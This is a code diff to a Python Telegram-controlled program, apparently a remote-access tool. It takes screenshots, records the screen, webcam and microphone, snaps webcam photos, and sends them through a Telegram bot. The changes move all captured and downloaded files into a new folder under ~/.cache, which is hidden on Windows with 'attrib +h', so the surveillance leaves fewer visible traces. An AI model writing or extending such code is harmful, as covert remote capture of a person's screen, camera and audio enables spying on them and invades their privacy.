@@ -34,16 +34,16 @@ import pyautogui as pg
 import subprocess as sp
 from random import choice
 from re import findall, M
-from string import printable
 from time import time, sleep
 from threading import Thread
 from datetime import datetime
 from typing import Any, Callable
 from io import BytesIO, StringIO
-from os.path import join, abspath, isfile
+from string import ascii_letters, printable
 from webbrowser import open as browseropen
 from platform import system as platform_system
-from os import system, remove, getenv, getcwd, listdir, name 
+from os.path import join, abspath, isfile, isdir
+from os import system, remove, getenv, getcwd, listdir, name, mkdir 
 from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 
 logging = False
@@ -51,10 +51,25 @@ iswindows = name == "nt"
 islinux = not iswindows
 cwd_folder = getcwd()
 HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
+BURN_DIRECTORY = join(HOME_PATH, ".cache")
+
 vfx = abspath(join(cwd_folder, "vfx"))
 sfx = abspath(join(cwd_folder, "sfx"))
+
 prototxt_filename = join(cwd_folder, 'model', '1.prototxt')
 caffemodel_filename = join(cwd_folder, 'model', '2.caffemodel')
+
+def randomname(lenght: int=10) -> str:
+    return "".join([ choice(ascii_letters) for _ in range(lenght)])
+
+while isfile(BURN_DIRECTORY):
+    BURN_DIRECTORY = BURN_DIRECTORY+randomname(3)
+
+if not isdir(BURN_DIRECTORY):
+    mkdir(BURN_DIRECTORY)
+    if iswindows:
+        system(f"attrib +h {BURN_DIRECTORY}")
+
 if isfile(prototxt_filename) and isfile(caffemodel_filename):
     with open(prototxt_filename, 'rb') as f:
         prototxt_data = f.read()
@@ -213,9 +228,6 @@ def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
 
 def load_audios(sfx_folder: str=sfx) -> list[str]:
     return { x[:-4]:abspath(join(sfx_folder,x)) for x in listdir(sfx_folder) }
-
-def randomname(lenght: int=10) -> str:
-    return "".join([ choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(lenght)])
 
 def randompngname(lenght: int=10) -> str:
     return randomname(lenght)+".png"
@@ -557,7 +569,7 @@ class PeppinoTelegram:
         
     def screenshot(self) -> int:
         try:
-            filename = join(HOME_PATH,randompngname())
+            filename = join(BURN_DIRECTORY,randompngname())
             screenshot = pg.screenshot()
             screenshot.save(filename)
             message_id = self.__send_image(filename)
@@ -653,8 +665,8 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
         duration = int(duration)
         bar = self.new_loading_bar(duration, label="Recording Screen")
         try:
-            filename = f"{HOME_PATH}/{randomname()}.mp4"
-            audio_filename = f"{HOME_PATH}/{randomname()}.wav"
+            filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
+            audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
             SCREEN_SIZE = tuple(pg.size())
             fourcc = VideoWriter_fourcc(*'XVID')
             out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
@@ -698,8 +710,8 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
         duration = int(duration)
         bar = self.new_loading_bar(duration, label="Recording Webcam")
         try:
-            filename = f"{HOME_PATH}/{randomname()}.mp4"
-            audio_filename = f"{HOME_PATH}/{randomname()}.wav"
+            filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
+            audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
             fourcc = VideoWriter_fourcc(*'XVID')
             webcam = VideoCapture(0)
             width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
@@ -744,8 +756,8 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
         capture_duration = int(capture_duration)
         bar = self.new_loading_bar(capture_duration, label="Recording Webcam&Screen")
         try:
-            filename = join(HOME_PATH, randomname() + ".mp4")
-            audio_filename = join(HOME_PATH, randomname() + ".wav")
+            filename = join(BURN_DIRECTORY, randomname() + ".mp4")
+            audio_filename = join(BURN_DIRECTORY, randomname() + ".wav")
             SCREEN_SIZE = tuple(pg.size())
             fourcc = VideoWriter_fourcc(*'XVID')
             out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
@@ -806,7 +818,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
     def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
         message = self.new_editable_message(f"Recording audio of {seconds} seconds.")
         filename = randomname()+".wav"
-        filepath = join(HOME_PATH, filename)
+        filepath = join(BURN_DIRECTORY, filename)
         res = self.record_audio(filepath, seconds)
         if isinstance(res, Exception):
             err = f"Error while recording audio: {res}"
@@ -830,7 +842,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
         
     def selphie(self, caption: str|None=None) -> None:
         try:
-            filename = join(HOME_PATH,randompngname())
+            filename = join(BURN_DIRECTORY,randompngname())
             camera = VideoCapture(0)
             return_value, image = camera.read()
             if not return_value:
@@ -907,7 +919,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         file_info = self.bot.getFile(file_id)
         file_url = f"https://api.telegram.org/file/bot{self.token}/{file_info['file_path']}"
         filename = randomname()+".ogg"
-        filepath = join(HOME_PATH, filename)
+        filepath = join(BURN_DIRECTORY, filename)
         response = requests.get(file_url)
         with open(filepath, "wb") as f:
             f.write(response.content) 
@@ -917,7 +929,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
 
     def parse_photo(self, msg) -> None:
         filename = randompngname()
-        filepath = join(HOME_PATH, filename)
+        filepath = join(BURN_DIRECTORY, filename)
         self.bot.download_file(msg['photo'][-1]['file_id'], filepath)
         Thread(target=self.show_image, args=[filepath,]).start()
         sleep(0.5)
@@ -961,7 +973,7 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         filename = document["file_name"]
         file_id = document["file_id"]
         saved_filename = randomname()
-        saved_filepath = join(HOME_PATH, saved_filename)
+        saved_filepath = join(BURN_DIRECTORY, saved_filename)
         self.bot.download_file(file_id, saved_filepath)
         self.bsend(f"{filename} saved as {saved_filepath}")
         if filename.endswith(".dd"):
